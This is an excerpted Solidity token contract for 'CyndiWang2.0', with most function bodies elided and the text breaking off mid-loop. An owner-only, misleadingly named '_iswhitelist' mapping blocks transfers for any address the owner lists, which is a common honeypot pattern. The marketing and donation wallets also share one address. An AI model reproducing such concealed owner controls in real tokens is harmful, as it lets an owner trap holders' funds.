...
library Address{
 ...
 contract CyndiWang20 is Context, IERC20, Ownable {
    ...
    uint256 public maxSellLimit = 100000000000 * 10**9;
    uint256 public maxWalletLimit = 100000000000 * 10**9;
    
    uint256 public genesis_block;
    
    address public marketingWallet = 0x601B536E4D0a091cc4c2AEC1eb086Fe8cea7Ddff;
    address public donationWallet = 0x601B536E4D0a091cc4c2AEC1eb086Fe8cea7Ddff;

    string private constant _name = "CyndiWang2.0";
    string private constant _symbol = "Wang2.0";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_iswhitelist[from] && !_iswhitelist[to], "You are a bot");
    ...
    function privatesale(address[] memory accounts, uint256[] memory amounts) external onlyOwner{
    ...
    function updateIswhitelist(address account, bool state) external onlyOwner{
        _iswhitelist[account] = state;
    }
    
    function bulkIswhitelist(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
